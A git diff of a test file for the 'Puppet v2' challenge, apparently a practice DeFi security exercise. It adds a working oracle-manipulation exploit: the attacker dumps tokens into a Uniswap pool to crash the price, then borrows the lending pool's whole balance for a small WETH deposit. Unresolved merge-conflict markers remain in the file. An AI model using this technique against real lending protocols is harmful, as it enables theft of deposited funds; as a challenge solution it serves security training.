@@ -81,8 +81,31 @@ describe('[Challenge] Puppet v2', function () {
         ).to.eq(300000n * 10n ** 18n);
     });
 
+<<<<<<< Updated upstream
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+=======
+    it('Exploit', async function () {
+        const attackRouter = this.uniswapRouter.connect(attacker)
+        const attackPool = this.lendingPool.connect(attacker)
+        const attackWeth = this.weth.connect(attacker)
+        const attackToken = this.token.connect(attacker)
+
+        await attackToken.approve(attackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        await attackRouter.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            10 ** 10
+        )
+        const requiredWETH = await attackPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        attackWeth.deposit({ value: ethers.utils.parseEther("19.6") })
+
+        await attackWeth.approve(attackPool.address, requiredWETH)
+        await attackPool.borrow(POOL_INITIAL_TOKEN_BALANCE)
+>>>>>>> Stashed changes
     });
 
     after(async function () {
